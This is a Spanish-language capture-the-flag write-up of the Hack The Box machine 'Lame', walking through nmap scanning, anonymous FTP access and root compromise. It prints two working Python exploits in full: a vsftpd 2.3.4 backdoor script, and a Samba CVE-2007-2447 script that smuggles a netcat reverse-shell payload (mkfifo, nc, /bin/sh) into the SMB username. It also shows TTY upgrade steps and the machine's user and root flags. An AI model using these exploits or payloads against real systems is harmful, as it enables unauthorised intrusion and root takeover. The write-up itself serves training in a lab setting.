---
layout: single
title: <span class="htb">Lame - Hack The Box</span>
excerpt: "A partir del día de hoy empezaré a realizar un write up diario de las máquinas retiradas de Hack the Box, es el turno de Lame, una máquina easy donde ganaremos acceso al sistema con permisos root 
explotando una vulnerabilidad de samba CVE-2007-2447."
date: 2022-07-13
classes: wide
header:
  teaser: /assets/images/Lame/Lame.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.png
categories:
  - Hack The Box
  - Easy
tags: 
  - Samba
  - Ftp
  - CVE-2007-2447
---

## DESCRIPCION

A partir del día de hoy empezaré a realizar un write up diario de las máquinas retiradas de Hack the Box, es el turno de Lame, una máquina easy donde ganaremos acceso al sistema con permisos root
explotando una vulnerabilidad de samba CVE-2007-2447.

<p style="text-align:center;"><img src="../assets/images/Lame/Lame_descripcion.png"></p>

## INDICE

- [Reconocimientos de puertos](#reconocimiento-de-puertos)
- [Vías potenciales](#vias)
	- [FTP &#10060;](#ftp)
	- [Samba &#9989;](#samba)
		- [Script](#script-usermap_script)
- [TTY Spawn](#tty-spawn)
- [Flags](#flags)
- [Conocimientos](#conocimientos-obtenidos)
- [Autores y Referencias](#autores-y-referencias)

## RECONOCIMIENTO DE PUERTOS
Lo primero será ver que puertos están abiertos en la máquina objetivo, para ello utilizaremos la herramienta `Nmap`

```zsh
cat Puertos
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Puertos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap --open -p- -T5 -Pn -oG Puertos 10.10.10.3
   2   │ Host: 10.10.10.3 () Status: Up
   3   │ Host: 10.10.10.3 () Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3632/open/tcp//distccd/// Ignored State: filtered (65530)
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ Reconocimiento Puertos

{*} Extrayendo puertos...

        La direccion ip es: 10.10.10.3
        Los puertos abiertos son: 21,22,139,445,3632

        Los puertos han sido copiados al portapapeles

```
<br>
Una vez sabemos que puertos están abiertos en la víctima, lanzaremos unos scripts de reconocimiento básicos.

```zsh
nmap -sCV -O -p 21,22,139,445,3632 -oN Objetivos 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.054s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|remote management|printer|general purpose|power-device
Running (JUST GUESSING): Linux 2.4.X|2.6.X (92%), Dell embedded (92%), Linksys embedded (92%), Tranzeo embedded (92%), Xerox embedded (92%), Dell iDRAC 6 (92%), Raritan embedded (92%)
OS CPE: cpe:/o:linux:linux_kernel:2.4.36 cpe:/h:dell:remote_access_card:6 cpe:/h:linksys:wet54gs5 cpe:/h:tranzeo:tr-cpq-19f cpe:/h:xerox:workcentre_pro_265 cpe:/o:linux:linux_kernel:2.4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:dell:idrac6_firmware
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Raritan Dominion PX DPXR20-20L power control unit (92%), LifeSize video conferencing system (Linux 2.4.21) (92%), Linux 2.6.23 (91%), OpenWrt White Russian 0.9 (Linux 2.4.30) (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|_  FQDN: lame.hackthebox.gr
|_clock-skew: mean: 2h00m21s, deviation: 2h49m45s, median: 19s

```
<br>
<h1 style="text-align: center;" id="vias">Vías Potenciales</h1>

## FTP

Podemos observar que tenemos acceso por `ftp` con las credenciales `anonymous:anonymous`, vamos a ver que encontramos.

```zsh
ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:void4m0n): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||21114|).
150 Here comes the directory listing.
226 Directory send OK.

```
<br>
No hemos encontrado nada de valor, sabiendo que el ftp tiene como versión `vsFTPd 2.3.4` podemos ver si existe alguna vulnerabilidad.

```zsh
searchsploit vsFTPd 2.3.4
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                    | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                       | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

```
<br>
Parece que tenemos posibilidad de comprometer a la víctima, vamos a ver el exploit.

```python
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3

from telnetlib import Telnet
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)
parser=argparse.ArgumentParser()
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()
host = args.host
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()%

```
Lanzamos el script de la siguiente forma `python3 49757.py 10.10.10.3`, pero no conseguimos entablar el backdoor. Tendremos que encontrar otro posible vector de ataque.

## SAMBA

Si vemos la versión de samba que nos mostraba nmap tenemos lo siguiente `445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)`, buscamos una vulnerabilidad para esta versión de 
samba.

```
searchsploit Samba 3.0.20
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                             | unix/remote/16320.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

```

Parece ser vulnerable. Si hacemos una pequeña labor de investigación descubrimos que el CVE correspondiente es `CVE-2007-2447` tenemos un informe del 
<a href="https://www.incibe-cert.es/alerta-temprana/vulnerabilidades/cve-2007-2447" target="_blank">Incibe</a> acerca de esta vulnerabilidad, por si le queréis echar un vistazo,
como no queremos tirar de Metasploit vamos a buscar un script que abuse de esta vulnerabilidad en Github.

Tenemos este repositorio de <a href="https://github.com/amriunix/CVE-2007-2447" target="_blank">Github</a> donde gracias a un script en python se puede conseguir entablar una reverse shell.
El autor explica la vulnerabilidad en su <a href="https://amriunix.com/post/cve-2007-2447-samba-usermap-script/" target="_blank">Blog<a>.

### Script usermap_script

Visualizamos el contenido del script:

```python
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: usermap_script.py
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/python
   2   │ # -*- coding: utf-8 -*-
   3   │ 
   4   │ # From : https://github.com/amriunix/cve-2007-2447
   5   │ # case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/
   6   │ 
   7   │ import sys
   8   │ from smb.SMBConnection import SMBConnection
   9   │ 
  10   │ def exploit(rhost, rport, lhost, lport):
  11   │         payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
  12   │         username = "/=`nohup " + payload + "`"
  13   │         conn = SMBConnection(username, "", "", "")
  14   │         try:
  15   │             conn.connect(rhost, int(rport), timeout=1)
  16   │         except:
  17   │             print("[+] Payload was sent - check netcat !")
  18   │ 
  19   │ if __name__ == '__main__':
  20   │     print("[*] CVE-2007-2447 - Samba usermap script")
  21   │     if len(sys.argv) != 5:
  22   │         print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
  23   │     else:
  24   │         print("[+] Connecting !")
  25   │         rhost = sys.argv[1]
  26   │         rport = sys.argv[2]
  27   │         lhost = sys.argv[3]
  28   │         lport = sys.argv[4]
  29   │         exploit(rhost, rport, lhost, lport)
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
<br>
Para ejecutar el script se necesitan los siguientes parámetros.

```markdown
  * `RHOST` -- The target address
  * `RPORT` -- The target port (TCP : 445)
  * `LHOST` -- The listen address
  * `LPORT` -- The listen port

```
<br>
Antes de ejecutar el script nos pondremos por escucha con `netcat` por el puerto equivalente al `LPORT` en nuestro caso el `1234`

```zsh
❯ nc -lvnp 1234
listening on [any] 1234 ...

```
<br>
Ejecutamos el script y agregamos los parámetros necesarios.

```python
[-] usage: python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>

python3 usermap_script.py 10.10.10.3 445 10.10.16.3 1234
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !

```
<br>
Como el propio script nos dice vamos a ver si hemos conseguido entablar la reverse shell.

```zsh
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.3] 58132
whoami
root

```
## TTY SPAWN

¡Perfecto! Somos usuario root, ya podríamos obtener `user.txt | root.txt`, pero como de costumbre vamos a spawnear una TTY totalmente interactiva para trabajar de mejor forma.

```
script /dev/null -c bash
root@lame:/# ^Z
[1]  + 6995 suspended  nc -lvnp 1234
❯ stty raw -echo; fg
[1]  + 6995 continued  nc -lvnp 1234
*************************En este momento debemos poner [reset xterm] no se nos mostrará ningún texto en pantalla, presionamos enter
root@lame:/# 

```
Ahora ya podemos trabajar de una forma adecuada con ^C, historial, flechas de movimiento, etc...


## Flags

En este momento solo nos falta buscar las flags en sus respectivos directorios.

<h4>USER.TXT</h4>

```zsh
root@lame:/home/makis# cat user.txt 
2d319f5768304c5ba18d51dae9743fc9
```

<h4>ROOT.TXT</h4>

```zsh
root@lame:/root# cat root.txt 
cb7055f4b510b3c3bb5dd343d50a9e47
```
## CONOCIMIENTOS OBTENIDOS

De la máquina <em>LAME</em> podemos extraer los siguientes conocimientos:

- Reconocimiento de puertos con Nmap.
- Investigación acerca de vulnerabilidades.
- Explotar una vulnerabilidad sin Metasploit.
- Spawnear una TTY totalmente interactiva.

## AUTORES y REFERENCIAS

Autor del write up: Luis Miranda Sierra. <a href="https://app.hackthebox.com/profile/1104062" target="_blank">HTB</a>.

Autor de la máquina: ch4p, muchas gracias por la creación de Lame aportando a la comunidad. <a href="https://app.hackthebox.com/users/1" target="_blank">HTB</a>.
